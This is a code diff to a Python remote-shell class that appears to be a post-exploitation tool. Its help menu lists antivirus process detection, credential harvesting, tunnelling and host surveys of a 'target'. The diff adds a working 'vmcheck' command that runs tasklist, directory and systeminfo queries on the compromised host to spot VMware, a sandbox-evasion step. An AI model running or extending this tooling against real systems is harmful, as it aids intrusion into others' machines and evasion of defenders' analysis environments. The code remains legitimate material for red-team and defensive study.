@@ -142,10 +142,11 @@ class RemoteShell(cmd.Cmd):
   ! {cmd}                    - executes a local shell cmd
   cat                        - view file contents
   ls                         - you should know this, will show hidden files 
----------------------------------------------------------------------------------------------
+ --------------------------------------------------------------------------------------------
  + Process Accounting                                                                      +
----------------------------------------------------------------------------------------------
+ --------------------------------------------------------------------------------------------
   psp                        - looks for Anti-Virus solutions running in the process list
+  vmcheck                    - attempts to detect if we are running in a vm
  --------------------------------------------------------------------------------------------
  + Credential Harvesting                                                                    +
  --------------------------------------------------------------------------------------------
@@ -157,9 +158,9 @@ class RemoteShell(cmd.Cmd):
   showtun                   - see all tunnels
   addtun                    - add tunnel --> addtun lport rhost rport --> 10000 10.0.0.1 443
   deltun                    - delete tunnel --> deltun lport --> deltun 11000  
----------------------------------------------------------------------------------------------
-+ Collection                                                                               +
----------------------------------------------------------------------------------------------
+ --------------------------------------------------------------------------------------------
+ + Collection                                                                               +
+ --------------------------------------------------------------------------------------------
   loggrab                   - collects log of your choice --> loggrab Security.evtx 
   survey                    - performs host survey of target, saves output to local machine
   """)
@@ -354,6 +355,30 @@ class RemoteShell(cmd.Cmd):
                 self.__outputBuffer = ''
         except:
             pass
+
+    def do_vmcheck(self, s):
+        try:
+            logging.info("Common Processes: ")
+            self.execute_remote('tasklist /svc | findstr /i "vmtoolsd.exe"')
+            if len(self.__outputBuffer.strip('\r\n')) > 0:
+                buff = self.__outputBuffer
+                cprint(buff, "red")
+                self.__outputBuffer = ''
+            else:
+                logging.info("No VM Processes found")
+            self.execute_remote('dir "C:\Program Files\VMware"')
+            if len(self.__outputBuffer.strip('\r\n')) > 125: 
+                print(self.__outputBuffer)
+                self.__outputBuffer = ''
+            else:
+                self.__outputBuffer = ''
+                logging.info('C:\Program Files\VMWare Does not exist')
+            self.execute_remote('systeminfo | findstr /i "Manufacturer:"')
+            if len(self.__outputBuffer.strip('\r\n')) > 0: 
+                print(self.__outputBuffer)
+                self.__outputBuffer = ''
+        except:
+            logging.info("Something went wrong, try again")
 
     def do_cat(self, s):
         try:
